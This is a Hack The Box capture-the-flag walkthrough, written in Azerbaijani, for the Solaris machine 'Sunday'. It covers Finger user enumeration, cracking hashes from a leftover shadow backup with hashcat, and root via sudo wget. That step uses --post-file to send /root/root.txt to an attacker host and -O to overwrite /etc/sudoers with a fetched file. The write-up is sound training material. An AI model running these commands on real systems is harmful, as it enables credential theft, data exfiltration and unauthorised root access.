# Sunday (HTB)

> Platforma: Hack The Box  
> OS: Solaris  
> Çətinlik: Asan  
> Nəticə: root

---

## Hücum Zənciri

```text
Reconnaissance
├── nmap -sC -sV -p- sunday.htb → 79 (Finger), 22022 (SSH OpenSSH 8.4)
└── Platform: Solaris

Enumeration (Finger)
├── msfconsole → scanner/finger/finger_users
└── ./finger-user-enum.pl -u root -t <target>
    └── Response: root ... <PASSWORD> (Office Location = password hint)

Foothold (SSH)
├── ssh -p 22022 sunny@sunday.htb → password: <PASSWORD>
└── sudo -l → (root) NOPASSWD: /root/troll - TRAP

Lateral Movement (Backup)
├── cd /backup → agent22.backup, shadow.backup
├── sammy:<SHA256_HASH>
├── sunny:<SHA256_HASH>
└── hashcat -m 7400 → sammy:<PASSWORD>

User Flag
├── ssh -p 22022 sammy@sunday.htb (<PASSWORD>)
└── cat user.txt → <USER_FLAG>

Privilege Escalation (sudo wget)
├── sudo -l → (root) NOPASSWD: /usr/bin/wget
├── Exfil: sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
├── nc -lvnp 8000 → root flag (<ROOT_FLAG>)
├── Overwriting /etc/sudoers:
│   ├── echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
│   └── sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
└── sudo su → root
```

> Qeyd: Bütün flaglar, parollar və heşlər etik səbəblərə görə maskalanmışdır.

---

## Maşın Brifinqi

Solaris, port 79-da Finger xidməti və 22022 qeyri-standart portunda SSH ilə. `/backup/`-da `/etc/shadow`-un ehtiyat nüsxəsi qalıb.

---

## Kəşfiyyat

### Port Skanı

```bash
sudo nmap -sC -sV -p- sunday.htb
```

| Port  | Xidmət | Versiya        |
|-------|--------|----------------|
| 79    | Finger | Finger service |
| 22022 | SSH    | OpenSSH 8.4    |

Platforma - Solaris.

---

## Enumeration (Finger)

```bash
msfconsole
use scanner/finger/finger_users
set RHOST 10.129.77.192
run
```

Tapılan istifadəçilər: `root`, `sammy`, `sunny`, `adm`, `bin`, `daemon`, `sshd`, `openldap`.

```bash
./finger-user-enum.pl -u root -t 10.129.77.192
```

```
root@10.129.77.192: root     Super-User     pts/3     <Apr 24 10:37>     <PASSWORD>
```

Office Location sahəsi `<PASSWORD>` ehtiva edir - administratorun ipucusu.

---

## Foothold

```bash
ssh -p 22022 sunny@sunday.htb
# Password: <PASSWORD>

sudo -l
# User sunny may run the following commands on sunday:
#     (root) NOPASSWD: /root/troll

sudo /root/troll
# testing
# uid=0(root) gid=0(root)
```

Skript yalnız `id`-i çap edir. Root shell vermir.

---

## Lateral Movement (Backup)

```bash
cd /backup
ls
# agent22.backup  shadow.backup

cat shadow.backup
```

```
sammy:<SHA256_HASH>:6445::::::
sunny:<SHA256_HASH>:17636::::::
```

Format `$5$` - SHA-256 crypt, hashcat mode **7400**.

```bash
echo '<SHA256_HASH>' > hashes.txt
hashcat -m 7400 hashes.txt /usr/share/wordlists/rockyou.txt
# <PASSWORD>
```

**Vacib nüans:** yalnız heş, `username:` olmadan.

```bash
ssh -p 22022 sammy@sunday.htb
# Password: <PASSWORD>
cat user.txt
# <USER_FLAG>
```

---

## Privilege Escalation

```bash
sudo -l
# User sammy may run the following commands on sunday:
#     (root) NOPASSWD: /usr/bin/wget
```

### root.txt Exfil

```bash
nc -lvnp 8000
sudo wget --post-file=/root/root.txt http://10.10.14.160:8000/
# <ROOT_FLAG>
```

### Tam root - /etc/sudoers-ın dəyişdirilməsi

```bash
# Kali
echo "sammy ALL=(ALL) NOPASSWD: ALL" > sudoers
python3 -m http.server 8000

# target
sudo wget -O /etc/sudoers http://10.10.14.160:8000/sudoers
sudo su
whoami
# root
cat /root/root.txt
# <ROOT_FLAG>
```

---

## Bayraqlar

| Bayraq | Dəyər                            |
|--------|----------------------------------|
| User   | <USER_FLAG> |
| Root   | <ROOT_FLAG> |

---

## Əsas Nəticələr

- **Finger (79) - qiymətləndirilməmiş xidmət.** Yalnız istifadəçi siyahısı deyil, həm də Office Location kimi sahələrdə ipucları.
- **Qeyri-standart portlar** - mütləq `-p-` istifadə edin; 22022-də SSH-ı asanlıqla qaçırmaq olar.
- **Tələlər (`troll`)** - hər `sudo -l` nəticəsi real root-a aparmır.
- **Unudulmuş backup faylları** - `/backup/shadow.backup` heşləri verir.
- **wget üçün GTFOBins** - exfiltrasiya üçün `--post-file`, sistem fayllarını dəyişdirmək üçün `-O`.
- **Hash fayllarının formatlaşdırılması** - yalnız heş, metadatasız.
